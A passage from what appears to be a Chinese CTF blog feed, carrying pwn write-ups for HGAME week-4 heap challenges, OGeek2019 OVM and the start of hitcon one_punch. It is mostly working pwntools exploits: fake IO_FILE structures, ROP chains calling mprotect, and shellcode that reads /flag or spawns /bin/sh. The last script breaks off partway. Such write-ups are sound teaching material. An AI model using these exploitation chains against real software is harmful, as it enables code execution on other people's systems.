class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32393</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x520</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">2060528</span><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x520</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xcc0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>edit(<span class="hljs-number">2</span>, payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="4nswer’s-gift"><a href="#4nswer’s-gift" class="headerlink" title="4nswer’s gift"></a>4nswer’s gift</h3><p>这道题白给了libc的地址，并且直接让你去劫持IO控制流；虽然没有给堆地址，题目给了提示Linux内核版本为5.15，当申请堆块足够大时就会直接返回一块在libc上边的内存，且偏移固定，这样我们就能直接利用house of cat或者house of apple完成攻击。</p><p>​</p><p>house of cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30252</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x400</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x1c0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(sys_addr)<br><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, fake_IO_FILE)<br><span class="hljs-comment">#pause()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><p>house of apple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30252</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span> <span class="hljs-comment">#0x290000 0x380000</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>p64(pop_rdi), p64(fake_addr - <span class="hljs-number">0x10</span>),<br>p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>p64(mprotect),<br>p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><span class="hljs-comment">#print(hex(libcbase))</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>思科CVE-2020-3331</title>
    <link href="/2023/01/12/CVE-2020-3331/"/>
    <url>/2023/01/12/CVE-2020-3331/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu寒假练习2</title>
    <link href="/2023/01/07/buu2/"/>
    <url>/2023/01/07/buu2/</url>
    
    <content type="html"><![CDATA[<h3 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h3><p>这道vmpwn题分析起来并不难，输入一个整数，最高位的一字节对应着指令，剩下三个字节就对应寄存器和操作数，而漏洞也是很经典的数组越界。</p><p>我自己刚开始写的时候总想着先将got表中的值泄漏出来，得到libc的基地址后方便去写入system函数地址，程序虽然提供了打印寄存器这个指令，但是打印后会立马退出execute函数，这样就无法进一步去修改了；看到其他大佬写的<a href="https://www.cnblogs.com/lemon629/p/13975686.html">wp</a>后才反应过来可以利用got表中地址的偏移同样可以去修改。</p><p>攻击思路：</p><ol><li>利用数组越界得到got表中的libc地址；</li><li>利用该地址加或者减去一段偏移得到<code>__free_hook-8</code>的地址；</li><li>将<code>__free_hook-8</code>的地址写入全局变量comment中；</li><li>退出execute函数打印寄存器的值，可以得到libc的基地址，利用程序最后会向comment中的地址写入值和free该地址的特点，写入字符串“&#x2F;bin&#x2F;sh”和system函数地址。</li></ol><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25875</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcode</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">0x7fffffff</span> :<br>        num = <span class="hljs-number">0xffffffff</span> - num + <span class="hljs-number">1</span><br>        num = <span class="hljs-built_in">str</span>(num)<br>        num = <span class="hljs-string">&#x27;-&#x27;</span>+num<br>    <span class="hljs-keyword">else</span> :<br>        num = <span class="hljs-built_in">str</span>(num)<br>    <span class="hljs-keyword">return</span> num.encode()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;PCPC:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;SP:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;CODE SIZE:&#x27;</span>, <span class="hljs-string">b&#x27;20&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;CODE:&#x27;</span>)<br><br>p.sendline(sendcode(<span class="hljs-number">0x10000038</span>))    <span class="hljs-comment">#reg0 = 0x38</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30040001</span>))    <span class="hljs-comment">#reg4 = memory[reg1]</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30050001</span>))    <span class="hljs-comment">#reg5 = memory[reg1]</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010008</span>))    <span class="hljs-comment">#reg1 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010009</span>))    <span class="hljs-comment">#reg1 = 9</span><br>p.sendline(sendcode(<span class="hljs-number">0x70000001</span>))    <span class="hljs-comment">#reg0 = reg0 + reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010004</span>))    <span class="hljs-comment">#reg1 = 4</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70040400</span>))    <span class="hljs-comment">#reg4 = reg4 + reg0</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000008</span>))    <span class="hljs-comment">#reg0 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40040001</span>))    <span class="hljs-comment">#memory[reg1] = reg4</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40050001</span>))    <span class="hljs-comment">#memory[reg1] = reg5</span><br><br><span class="hljs-comment">#p.sendline(sendcode(0xff000000))</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;R4: &#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;R5: &#x27;</span>)<br>leak = (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span>) + leak<br>libcbase = leak + <span class="hljs-number">8</span> - libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;?\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><p>程序主要通过calloc分配堆块，分配时不会从tcache取出chunk；虽然有malloc函数，但必须满足<code>tcache_perthread_struct</code>中0x220大小的chunk的数量至少为7才可使用malloc分配，这样就无法直接去利用tcache去实现任意地址写。</p><p>Tcache Stashing Unlink Attack可以很好得解决上面的问题，具体请看：<a href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>​</p><p>这道题的思路就是先申请5个0x220大小的chunk放入tcache中，得到2个0x220大小small chunk后再修改small bin的最后一个 chunk的bk值 ：</p><img src="/img/10/Screenshot_20230113_045944.png" style="zoom:67%;" /><p>再次使用calloc时，会将修改的bk值也当作是一个真正的chunk放入tcache中：</p><img src="/img/10/Screenshot_20230113_050011.png" style="zoom:67%;" /><p>​</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hitcon_ctf_2019_one_punch&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = 